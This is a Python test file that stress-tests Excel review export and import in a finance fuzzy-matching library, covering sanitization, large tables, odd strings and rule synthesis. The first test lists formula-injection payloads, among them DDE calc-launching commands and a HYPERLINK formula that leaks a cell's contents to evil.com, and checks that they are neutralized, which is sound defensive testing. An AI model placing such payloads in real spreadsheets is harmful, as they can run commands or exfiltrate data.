"""Adversarial stress-testing suite for review_xlsx export and import roundtrips."""

from __future__ import annotations

import uuid
from pathlib import Path

import numpy as np
import openpyxl
import pandas as pd

from fuzzymatch_finance.label_store import LabeledPairStore, synthesize_rules_from_reviews
from fuzzymatch_finance.review_xlsx import (
    ReviewDecisions,
    export_review_xlsx,
    import_review_xlsx,
)


def test_stress_formula_injection_defense_and_roundtrip(tmp_path: Path) -> None:
    """Stress test malicious CSV/Excel formula injection strings."""
    injections = [
        "=CMD|' /C calc'!A0",
        "@SUM(1+1)",
        "+123",
        "-999",
        '=HYPERLINK("http://evil.com?leak="&A1,"Click here")',
        "-2+3+cmd|' /C calc'!A0",
        "+1-1",
        "=1+1",
        "@BIN2DEC(1101)",
        "=cmd|'/c calc'!A1",
        "+@SUM(A1:A10)",
        "-1+1",
    ]

    df = pd.DataFrame(
        {
            "source_id": injections,
            "target_id": [f"T_{i}" for i in range(len(injections))],
            "diff_text": injections,
            "decision": ["accept", "reject"] * (len(injections) // 2),
        }
    )

    out_file = tmp_path / "formula_stress.xlsx"
    export_review_xlsx(df, out_file)

    # 1. Direct inspection of written openpyxl worksheet cells
    wb = openpyxl.load_workbook(out_file)
    ws = wb["review"]

    for r_idx in range(2, len(injections) + 2):
        cell_src = ws.cell(row=r_idx, column=1).value
        cell_diff = ws.cell(row=r_idx, column=3).value

        assert isinstance(cell_src, str)
        assert cell_src.startswith("'"), f"Cell {cell_src!r} at row {r_idx} missing quote prefix"

        assert isinstance(cell_diff, str)
        assert cell_diff.startswith("'"), f"Cell {cell_diff!r} at row {r_idx} missing quote prefix"

    # 2. Re-import and check exact roundtrip desanitization in ReviewDecisions
    dec = import_review_xlsx(out_file)
    assert isinstance(dec, ReviewDecisions)
    assert len(dec) == len(injections)

    for i, orig_str in enumerate(injections):
        expected_decision = i % 2 == 0
        assert orig_str in dec, f"Desanitized key {orig_str!r} missing from outcomes"
        assert dec[orig_str] is expected_decision

    # 3. Re-import as DataFrame and check column values
    df_imp = import_review_xlsx(out_file, as_dataframe=True)
    assert isinstance(df_imp, pd.DataFrame)
    assert len(df_imp) == len(injections)

    for orig_str in injections:
        assert orig_str in df_imp["source_id"].values
        assert orig_str in df_imp["diff_text"].values

    # 4. Verify legitimate strings that start with apostrophe but no injection prefix are preserved
    apostrophe_df = pd.DataFrame(
        {
            "source_id": ["'O'Connor", "'SingleQuote", "O'Reilly"],
            "target_id": ["T1", "T2", "T3"],
            "decision": ["accept", "reject", "accept"],
        }
    )
    p_apos = tmp_path / "apostrophes.xlsx"
    export_review_xlsx(apostrophe_df, p_apos)
    dec_apos = import_review_xlsx(p_apos)
    assert "'O'Connor" in dec_apos
    assert "'SingleQuote" in dec_apos
    assert "O'Reilly" in dec_apos


def test_stress_empty_and_single_row_frames(tmp_path: Path) -> None:
    """Stress test boundary condition DataFrames (0-row and 1-row)."""
    # 1. 0-row DataFrame without columns
    p_zero_no_cols = tmp_path / "zero_no_cols.xlsx"
    export_review_xlsx(pd.DataFrame(), p_zero_no_cols)
    assert p_zero_no_cols.exists()

    dec_zero1 = import_review_xlsx(p_zero_no_cols)
    assert isinstance(dec_zero1, ReviewDecisions)
    assert len(dec_zero1) == 0
    assert dec_zero1.to_dataframe().empty

    dec_zero1_df = import_review_xlsx(p_zero_no_cols, as_dataframe=True)
    assert isinstance(dec_zero1_df, pd.DataFrame)
    assert dec_zero1_df.empty

    # 2. 0-row DataFrame with custom entity columns
    p_zero_custom = tmp_path / "zero_custom.xlsx"
    df_zero_custom = pd.DataFrame(columns=["vendor_code", "counterparty_code", "decision"])
    export_review_xlsx(df_zero_custom, p_zero_custom, source_id_col="vendor_code")
    assert p_zero_custom.exists()

    dec_zero2 = import_review_xlsx(p_zero_custom, source_id_col="vendor_code")
    assert isinstance(dec_zero2, ReviewDecisions)
    assert len(dec_zero2) == 0
    assert dec_zero2.to_dataframe().empty

    # 3. 1-row DataFrame accepted
    p_single_acc = tmp_path / "single_acc.xlsx"
    df_single_acc = pd.DataFrame(
        {
            "source_id": ["SRC_SOLO"],
            "target_id": ["TGT_SOLO"],
            "decision": ["accept"],
        }
    )
    export_review_xlsx(df_single_acc, p_single_acc)
    dec_single_acc = import_review_xlsx(p_single_acc)
    assert len(dec_single_acc) == 1
    assert dec_single_acc["SRC_SOLO"] is True

    # 4. 1-row DataFrame rejected
    p_single_rej = tmp_path / "single_rej.xlsx"
    df_single_rej = pd.DataFrame(
        {
            "source_id": ["SRC_REJ"],
            "target_id": ["TGT_REJ"],
            "decision": ["reject"],
        }
    )
    export_review_xlsx(df_single_rej, p_single_rej)
    dec_single_rej = import_review_xlsx(p_single_rej)
    assert len(dec_single_rej) == 1
    assert dec_single_rej["SRC_REJ"] is False

    # 5. 1-row DataFrame pending
    p_single_pen = tmp_path / "single_pen.xlsx"
    df_single_pen = pd.DataFrame(
        {
            "source_id": ["SRC_PEN"],
            "target_id": ["TGT_PEN"],
            "decision": ["pending"],
        }
    )
    export_review_xlsx(df_single_pen, p_single_pen)
    dec_single_pen = import_review_xlsx(p_single_pen)
    assert isinstance(dec_single_pen, ReviewDecisions)
    assert len(dec_single_pen) == 0
    assert dec_single_pen.to_dataframe().empty


def test_stress_large_candidate_tables_5000_rows(tmp_path: Path) -> None:
    """Stress test large candidate tables with 5,000+ rows."""
    n = 5500
    sources = [f"SRC_V_{i:05d}" for i in range(n)]
    targets = [f"TGT_V_{i:05d}" for i in range(n)]

    # Mix: 2000 accept, 2000 reject, 1500 pending
    decisions = ["accept"] * 2000 + ["reject"] * 2000 + ["pending"] * 1500

    df_large = pd.DataFrame(
        {
            "source_id": sources,
            "target_id": targets,
            "left_name": [f"Enterprise Supplier {i} LLC" for i in range(n)],
            "right_name": [f"Enterprise Supplier {i} Inc" for i in range(n)],
            "left_amount": [100.0 + (i % 500) for i in range(n)],
            "right_amount": [100.0 + (i % 500) + ((i % 3) * 0.05) for i in range(n)],
            "fuzzy_score": [0.50 + ((i % 100) * 0.005) for i in range(n)],
            "decision": decisions,
        }
    )

    p_large = tmp_path / "stress_5500.xlsx"
    export_review_xlsx(
        df_large,
        p_large,
        diff_cols=[("left_name", "right_name"), ("left_amount", "right_amount")],
    )
    assert p_large.exists()
    assert p_large.stat().st_size > 50_000

    # Import
    dec_res = import_review_xlsx(p_large)
    assert isinstance(dec_res, ReviewDecisions)
    assert len(dec_res) == 4000  # 2000 accept + 2000 reject, 1500 pending excluded

    # Verify counts
    num_accepted = sum(1 for v in dec_res.values() if v is True)
    num_rejected = sum(1 for v in dec_res.values() if v is False)
    assert num_accepted == 2000
    assert num_rejected == 2000

    # Check dataframe representation
    res_df = dec_res.to_dataframe()
    assert len(res_df) == 4000
    assert "pending" not in res_df["decision"].str.lower().values


def test_stress_extreme_string_lengths_and_multiline(tmp_path: Path) -> None:
    """Stress test strings of 5,000+ characters, newlines, tabs, and Unicode."""
    long_str_1 = "A" * 5200
    long_str_2 = "B" * 6000
    multiline_str = "Line 1\nLine 2\nLine 3\tTabbed\tContent\nFinal Line"
    unicode_str = "Unicode: 上海市 (Shanghai), München, São Paulo, ⚠️ Alert, 🔥 Fire, العربية"
    xml_chars = "XML chars: <xml> & 'single' and \"double\" </xml>"

    df = pd.DataFrame(
        {
            "source_id": ["LONG_1", "LONG_2", "MULTI", "UNICODE", "XML"],
            "target_id": ["T1", "T2", "T3", "T4", "T5"],
            "description": [long_str_1, long_str_2, multiline_str, unicode_str, xml_chars],
            "decision": ["accept", "reject", "accept", "accept", "reject"],
        }
    )

    p_extreme = tmp_path / "extreme_strings.xlsx"
    export_review_xlsx(df, p_extreme)
    assert p_extreme.exists()

    # Verify column dimensions max cap (45) works without error
    wb = openpyxl.load_workbook(p_extreme)
    ws = wb["review"]
    col_loc = df.columns.get_loc("description")
    assert isinstance(col_loc, int)
    desc_col_letter = openpyxl.utils.get_column_letter(col_loc + 1)
    col_width = ws.column_dimensions[desc_col_letter].width
    assert col_width <= 45

    # Roundtrip import
    df_imp = import_review_xlsx(p_extreme, as_dataframe=True)
    assert isinstance(df_imp, pd.DataFrame)
    assert len(df_imp) == 5

    desc_map = dict(zip(df_imp["source_id"], df_imp["description"]))
    assert desc_map["LONG_1"] == long_str_1
    assert desc_map["LONG_2"] == long_str_2
    assert desc_map["MULTI"] == multiline_str
    assert desc_map["UNICODE"] == unicode_str
    assert desc_map["XML"] == xml_chars


def test_stress_non_string_id_columns_integers_and_floats(tmp_path: Path) -> None:
    """Stress test non-string ID columns: integers, floats, NaNs."""
    df = pd.DataFrame(
        {
            "source_id": [1001, 1002.5, np.nan, "STR_ID"],
            "target_id": [2001, 2002.0, 9999, "TGT_ID"],
            "decision": ["accept", "reject", "accept", "reject"],
        }
    )

    p_non_str = tmp_path / "non_string_ids.xlsx"
    export_review_xlsx(df, p_non_str)
    assert p_non_str.exists()

    # Import as ReviewDecisions
    dec = import_review_xlsx(p_non_str)
    assert isinstance(dec, ReviewDecisions)
    assert "1001" in dec
    assert dec["1001"] is True
    assert "1002.5" in dec
    assert dec["1002.5"] is False
    assert "STR_ID" in dec
    assert dec["STR_ID"] is False

    # Import as DataFrame
    df_imp = import_review_xlsx(p_non_str, as_dataframe=True)
    assert isinstance(df_imp, pd.DataFrame)
    assert len(df_imp) == 4


def test_stress_uuid_and_pd_na_handling(tmp_path: Path) -> None:
    """Stress test UUID objects and pd.NA in DataFrames passed to export_review_xlsx."""
    u1 = uuid.uuid4()
    df_uuid = pd.DataFrame(
        {
            "source_id": [u1],
            "target_id": ["T1"],
            "decision": ["accept"],
        }
    )
    p_uuid = tmp_path / "uuid.xlsx"

    export_review_xlsx(df_uuid, p_uuid)
    assert p_uuid.exists()

    dec = import_review_xlsx(p_uuid)
    assert isinstance(dec, ReviewDecisions)
    assert str(u1) in dec
    assert dec[str(u1)] is True

    # Test pd.NA in nullable columns
    df_na = pd.DataFrame(
        {
            "source_id": ["S1"],
            "target_id": ["T1"],
            "notes": [pd.NA],
            "decision": ["accept"],
        }
    )
    p_na = tmp_path / "pd_na.xlsx"
    export_review_xlsx(df_na, p_na)
    assert p_na.exists()

    dec_na = import_review_xlsx(p_na, as_dataframe=True)
    assert isinstance(dec_na, pd.DataFrame)
    assert len(dec_na) == 1
    assert dec_na["source_id"].iloc[0] == "S1"


def test_stress_extraneous_user_columns_and_reordering(tmp_path: Path) -> None:
    """Stress test user-added columns, column reordering, and extra sheets."""
    wb = openpyxl.Workbook()
    # Add an extraneous sheet first
    ws_meta = wb.active
    ws_meta.title = "Metadata"
    ws_meta.append(["Export Date", "Reviewer"])
    ws_meta.append(["2026-10-27", "Jane Doe"])

    # Review sheet with reordered columns and extra user notes
    ws_rev = wb.create_sheet(title="review")
    headers = [
        "reviewer_notes",
        "decision",
        "timestamp",
        "source_id",
        "target_id",
        "auditor_signature",
    ]
    ws_rev.append(headers)
    ws_rev.append(["LGTM", "accept", "2026-10-27 10:00", "SRC_A", "TGT_A", "JD"])
    ws_rev.append(["Suspicious mismatch", "reject", "2026-10-27 10:05", "SRC_B", "TGT_B", "JD"])
    ws_rev.append(["Waiting for tax docs", "pending", "2026-10-27 10:10", "SRC_C", "TGT_C", "JD"])

    p_extra = tmp_path / "extra_cols.xlsx"
    wb.save(p_extra)

    dec = import_review_xlsx(p_extra)
    assert isinstance(dec, ReviewDecisions)
    assert len(dec) == 2
    assert dec["SRC_A"] is True
    assert dec["SRC_B"] is False
    assert "SRC_C" not in dec

    # Check extraneous columns retained in DataFrame
    df_imp = dec.to_dataframe()
    assert "reviewer_notes" in df_imp.columns
    assert "auditor_signature" in df_imp.columns
    assert list(df_imp["reviewer_notes"]) == ["LGTM", "Suspicious mismatch"]


def test_stress_all_rows_pending_or_unresolved(tmp_path: Path) -> None:
    """Stress test when all rows are pending, investigate, blank, or None."""
    df = pd.DataFrame(
        {
            "source_id": [f"S_{i}" for i in range(6)],
            "target_id": [f"T_{i}" for i in range(6)],
            "decision": ["pending", "PENDING", " Investigate ", "", None, float("nan")],
        }
    )

    p_all_pen = tmp_path / "all_pending.xlsx"
    export_review_xlsx(df, p_all_pen)

    dec = import_review_xlsx(p_all_pen)
    assert isinstance(dec, ReviewDecisions)
    assert len(dec) == 0
    assert dec == {}
    assert dec.to_dataframe().empty

    df_imp = import_review_xlsx(p_all_pen, as_dataframe=True)
    assert isinstance(df_imp, pd.DataFrame)
    assert len(df_imp) == 0


def test_stress_case_insensitivity_and_whitespace(tmp_path: Path) -> None:
    """Stress test case insensitivity and whitespace handling in decisions."""
    df = pd.DataFrame(
        {
            "source_id": ["S1", "S2", "S3", "S4"],
            "target_id": ["T1", "T2", "T3", "T4"],
            "decision": ["  ACCEPT  ", "Accept", "  REJECT\t", "Reject\n"],
        }
    )

    p_case = tmp_path / "case_whitespace.xlsx"
    export_review_xlsx(df, p_case)

    dec = import_review_xlsx(p_case)
    assert len(dec) == 4
    assert dec["S1"] is True
    assert dec["S2"] is True
    assert dec["S3"] is False
    assert dec["S4"] is False


def test_stress_rule_synthesis_integration(tmp_path: Path) -> None:
    """Stress test end-to-end integration with active rule synthesis and LabelStore."""
    df = pd.DataFrame(
        {
            "source_id": ["=CMD|calc", "SRC_REGULAR", "+1001", "SRC_PEN"],
            "target_id": ["TGT_EVIL", "TGT_GOOD", "TGT_PLUS", "TGT_PENDING"],
            "decision": ["accept", "accept", "reject", "pending"],
        }
    )

    p_review = tmp_path / "integration_review.xlsx"
    export_review_xlsx(df, p_review)

    dec = import_review_xlsx(p_review)
    assert len(dec) == 3

    # Pass directly into synthesize_rules_from_reviews
    p_store = tmp_path / "store.csv"
    rule_set, store = synthesize_rules_from_reviews(dec, label_store=p_store)

    assert isinstance(store, LabeledPairStore)
    assert len(rule_set) == 2  # 2 accepted pairs -> 2 rules

    # Test rule targets and applicability
    rule_target_ids = [rule.target["target_id"] for rule in rule_set]
    assert "TGT_EVIL" in rule_target_ids
    assert "TGT_GOOD" in rule_target_ids

    # Matching rule applies to original desanitized input
    evil_rule = next(r for r in rule_set if r.target["target_id"] == "TGT_EVIL")
    assert evil_rule.applies_to("=CMD|calc") is True

    # Check store labels
    stored_pairs = {(p.left_key, p.right_key): p.label for p in store.all()}
    assert stored_pairs[("=CMD|calc", "TGT_EVIL")] == 1
    assert stored_pairs[("SRC_REGULAR", "TGT_GOOD")] == 1
    assert stored_pairs[("+1001", "TGT_PLUS")] == 0
